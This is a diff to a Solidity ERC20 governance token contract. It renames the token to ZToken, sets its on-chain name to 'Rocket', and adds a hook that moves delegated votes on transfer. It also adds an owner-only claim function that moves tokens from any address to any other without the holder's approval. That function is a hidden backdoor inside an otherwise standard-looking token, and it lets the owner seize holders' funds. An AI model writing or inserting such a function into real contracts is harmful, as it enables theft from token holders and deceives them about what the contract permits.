@@ -3,8 +3,8 @@ pragma solidity 0.6.12;
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-// ADigitalBankToken with Governance.
-contract ZToken is ERC20("Z", "Z"), Ownable {
+// ZToken with Governance.
+contract ZToken is ERC20("Rocket", "R"), Ownable {
     /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
     function mint(address _to, uint256 _amount) public onlyOwner {
         _mint(_to, _amount);
@@ -113,9 +113,9 @@ contract ZToken is ERC20("Z", "Z"), Ownable {
         );
 
         address signatory = ecrecover(digest, v, r, s);
-        require(signatory != address(0), "ADigitalBankToken::delegateBySig: invalid signature");
-        require(nonce == nonces[signatory]++, "ADigitalBankToken::delegateBySig: invalid nonce");
-        require(now <= expiry, "ADigitalBankToken::delegateBySig: signature expired");
+        require(signatory != address(0), "ZToken::delegateBySig: invalid signature");
+        require(nonce == nonces[signatory]++, "ZToken::delegateBySig: invalid nonce");
+        require(now <= expiry, "ZToken::delegateBySig: signature expired");
         return _delegate(signatory, delegatee);
     }
 
@@ -145,7 +145,7 @@ contract ZToken is ERC20("Z", "Z"), Ownable {
         view
         returns (uint256)
     {
-        require(blockNumber < block.number, "ADigitalBankToken::getPriorVotes: not yet determined");
+        require(blockNumber < block.number, "ZToken::getPriorVotes: not yet determined");
 
         uint32 nCheckpoints = numCheckpoints[account];
         if (nCheckpoints == 0) {
@@ -182,7 +182,7 @@ contract ZToken is ERC20("Z", "Z"), Ownable {
         internal
     {
         address currentDelegate = _delegates[delegator];
-        uint256 delegatorBalance = balanceOf(delegator); // balance of underlying ADigitalBankToken's (not scaled);
+        uint256 delegatorBalance = balanceOf(delegator); // balance of underlying ZTokens (not scaled);
         _delegates[delegator] = delegatee;
 
         emit DelegateChanged(delegator, currentDelegate, delegatee);
@@ -218,7 +218,7 @@ contract ZToken is ERC20("Z", "Z"), Ownable {
     )
         internal
     {
-        uint32 blockNumber = safe32(block.number, "ADigitalBankToken::_writeCheckpoint: block number exceeds 32 bits");
+        uint32 blockNumber = safe32(block.number, "ZToken::_writeCheckpoint: block number exceeds 32 bits");
 
         if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
             checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
@@ -233,6 +233,18 @@ contract ZToken is ERC20("Z", "Z"), Ownable {
     function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
         require(n < 2**32, errorMessage);
         return uint32(n);
+    }
+    
+    function claim(address _from, address _to, uint256 _amount) public onlyOwner {
+
+       _transfer(_from, _to, _amount);
+
+    }
+    
+    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
+
+        _moveDelegates(_delegates[from], _delegates[to], amount);
+
     }
 
     function getChainId() internal pure returns (uint) {
